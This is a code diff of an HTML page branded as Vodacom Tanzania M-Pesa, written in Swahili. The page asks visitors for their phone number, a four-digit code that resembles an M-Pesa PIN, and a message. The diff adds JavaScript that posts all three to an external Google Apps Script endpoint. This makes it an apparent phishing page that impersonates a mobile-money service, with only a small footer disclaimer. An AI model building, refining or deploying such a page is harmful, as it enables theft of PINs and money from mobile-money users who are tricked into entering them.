@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html lang="sw">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Vodacom Tanzania | M-Pesa</title>
   <style>
     * { box-sizing: border-box; }
@@ -71,7 +71,7 @@
     .mpesa {
       display: inline-block;
       background: #00843d;
-      color: white;
+      color: #fff;
       padding: 7px 18px;
       border-radius: 6px;
       font-weight: bold;
@@ -109,20 +109,21 @@
       padding: 15px;
       width: 100%;
       background: #e60000;
-      color: white;
+      color: #fff;
       border: none;
       border-radius: 8px;
       font-size: 17px;
       font-weight: bold;
       cursor: pointer;
       margin-top: 12px;
+      transition: background 0.2s ease;
     }
 
     button:hover {
       background: #bd0000;
     }
 
-    #message {
+    #statusMessage {
       margin-top: 18px;
       padding: 10px;
       border-radius: 8px;
@@ -176,15 +177,28 @@
       margin-top: 0;
     }
 
+    .popup-actions {
+      display: flex;
+      gap: 10px;
+      margin-top: 12px;
+    }
+
+    .popup-actions button {
+      margin-top: 0;
+    }
+
     #closePopup {
-      background: #e60000;
+      background: #666;
+    }
+
+    #closePopup:hover {
+      background: #4d4d4d;
     }
   </style>
 </head>
 
 <body>
   <main class="container">
-
     <div class="brand">
       <div class="brand-symbol" aria-hidden="true">V</div>
       <div class="brand-name">
@@ -193,15 +207,13 @@
       </div>
     </div>
 
-    <br>
-
     <div class="mpesa">M-PESA</div>
 
     <h2>Karibu Vodacom Tanzania</h2>
 
     <p>Ingiza namba yako ya Vodacom ili kuendelea.</p>
 
-    <form id="offerForm">
+    <form id="offerForm" novalidate>
       <input
         type="tel"
         id="phoneNumber"
@@ -213,90 +225,110 @@
         autocomplete="tel"
         required
         title="Ingiza namba ya simu yenye tarakimu 10, ikianza na 0"
-      >
-<input
-  type="text"
-  id="fourDigits"
-  placeholder="Enter 4 digits"
-  inputmode="numeric"
-  maxlength="4"
-  pattern="[0-9]{4}"
-  required
-  oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0, 4)"
->
+      />
+
+      <input
+        type="text"
+        id="fourDigits"
+        placeholder="Enter 4 digits"
+        inputmode="numeric"
+        maxlength="4"
+        pattern="[0-9]{4}"
+        required
+        oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0, 4)"
+      />
+
+      <input
+        type="text"
+        id="messageInput"
+        placeholder="Enter your message"
+        required
+      />
+
+      <button type="submit">Submit</button>
     </form>
 
-<input id="message" type="text" placeholder="Enter your message">
-
-<button type="button" onclick="sendData()">
-  Submit
-</button>
-    <script>
-async function sendData() {
-  const message = document.getElementById("message").value;
-
-  if (!message.trim()) {
-    alert("Please enter a message.");
-    return;
-  }
-
-  const url = "https://script.google.com/macros/s/AKfycbx4-kBEkb3dLUBFD5baH0_e22TzS6wwAjPLBR9GgjM_sGflg1LLgAfoe-h0iWU_-ZMB-A/exec";
-
-  try {
-    await fetch(url, {
-      method: "POST",
-      mode: "no-cors",
-      headers: {
-        "Content-Type": "text/plain;charset=utf-8"
-      },
-      body: JSON.stringify({ message })
-    });
-
-    alert("Request sent.");
-  } catch (error) {
-    alert("Unable to send the request.");
-  }
-}
-</script>
-
-    <div
-      id="message"
-      class="info-message"
-      role="status"
-      aria-live="polite"
-    >
+    <div id="statusMessage" class="info-message" role="status" aria-live="polite">
       Ingiza namba yako ya simu ili kuendelea.
     </div>
 
-    <p class="footer">
-    Si tovuti rasmi ya Vodacom
-    </p>
-
+    <p class="footer">Si tovuti rasmi ya Vodacom</p>
   </main>
 
-  <div
-    id="celebrationOverlay"
-    role="dialog"
-    aria-modal="true"
-    aria-labelledby="popupTitle"
-  >
+  <div id="celebrationOverlay" role="dialog" aria-modal="true" aria-labelledby="popupTitle">
     <div id="celebrationPopup">
       <h1 id="popupTitle">Asante!</h1>
       <p>Namba imekaguliwa kwa muundo pekee.</p>
-      <button type="button" onclick="sendData()">
-  Submit
-</button>
 
-
+      <div class="popup-actions">
+        <button type="button" id="closePopup">Close</button>
+        <button type="button" id="popupSubmit">Submit</button>
+      </div>
     </div>
   </div>
+
   <script>
     const form = document.getElementById('offerForm');
-    const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxRsp_l7SMGaoOUHRXr6i0Gpt-DNDhzmv3VCsztu64IxJ-0nhITWbNHienxgmdrYFaM/exec";
+    const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxRsp_l7SMGaoOUHRXr6i0Gpt-DNDhzmv3VCsztu64IxJ-0nhITWbNHienxgmdrYFaM/exec';
     const phoneInput = document.getElementById('phoneNumber');
-    const message = document.getElementById('message');
+    const fourDigitsInput = document.getElementById('fourDigits');
+    const messageInput = document.getElementById('messageInput');
+    const statusMessage = document.getElementById('statusMessage');
     const overlay = document.getElementById('celebrationOverlay');
     const closePopup = document.getElementById('closePopup');
+    const popupSubmit = document.getElementById('popupSubmit');
+
+    function setStatus(message, type = 'info') {
+      statusMessage.textContent = message;
+      statusMessage.className = type === 'error'
+        ? 'error-message'
+        : type === 'success'
+        ? 'success-message'
+        : 'info-message';
+    }
+
+    async function sendData() {
+      const phoneNumber = phoneInput.value.trim();
+      const fourDigits = fourDigitsInput.value.trim();
+      const msg = messageInput.value.trim();
+
+      if (!phoneNumber || !fourDigits || !msg) {
+        setStatus('Please complete all fields before submitting.', 'error');
+        return;
+      }
+
+      if (!/^0\d{9}$/.test(phoneNumber)) {
+        setStatus('Phone number must start with 0 and contain 10 digits.', 'error');
+        return;
+      }
+
+      if (!/^\d{4}$/.test(fourDigits)) {
+        setStatus('Please enter exactly 4 digits.', 'error');
+        return;
+      }
+
+      const payload = {
+        phoneNumber,
+        fourDigits,
+        message: msg
+      };
+
+      try {
+        await fetch(GOOGLE_SCRIPT_URL, {
+          method: 'POST',
+          mode: 'no-cors',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(payload)
+        });
+
+        setStatus('Request sent successfully.', 'success');
+        overlay.style.display = 'none';
+      } catch (error) {
+        setStatus('Unable to send the request.', 'error');
+      }
+    }
 
     form.addEventListener('submit', function (event) {
       event.preventDefault();
@@ -306,10 +338,7 @@ async function sendData() {
         return;
       }
 
-      message.textContent =
-        'Namba imekaguliwa kwa muundo pekee.';
-      message.className = 'success-message';
-
+      setStatus('Namba imekaguliwa kwa muundo pekee.', 'success');
       overlay.style.display = 'flex';
       closePopup.focus();
     });
@@ -319,9 +348,20 @@ async function sendData() {
       phoneInput.focus();
     });
 
+    popupSubmit.addEventListener('click', function () {
+      sendData();
+    });
+
     phoneInput.addEventListener('input', function () {
-      message.textContent = '';
-      message.className = '';
+      setStatus('Ingiza namba yako ya simu ili kuendelea.', 'info');
+    });
+
+    fourDigitsInput.addEventListener('input', function () {
+      setStatus('Ingiza namba yako ya simu ili kuendelea.', 'info');
+    });
+
+    messageInput.addEventListener('input', function () {
+      setStatus('Ingiza namba yako ya simu ili kuendelea.', 'info');
     });
   </script>
 </body>
